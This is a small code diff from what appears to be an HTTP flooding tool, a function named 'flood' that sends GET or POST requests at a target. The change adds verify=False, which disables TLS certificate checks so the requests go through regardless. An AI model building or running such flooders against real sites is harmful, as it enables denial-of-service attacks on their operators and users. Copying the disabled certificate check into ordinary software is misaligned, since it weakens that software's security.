@@ -27,9 +27,9 @@ def flood(target,domainname,attack):
     
     try:
         if attack =='get':
-            r = requests.get(target, params=payload, headers=headers, timeout=20)
+            r = requests.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
         else:
-            r = requests.post(target,params=payload ,headers=headers, timeout=20)
+            r = requests.post(target,params=payload ,headers=headers, timeout=20 , verify=False)
     except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
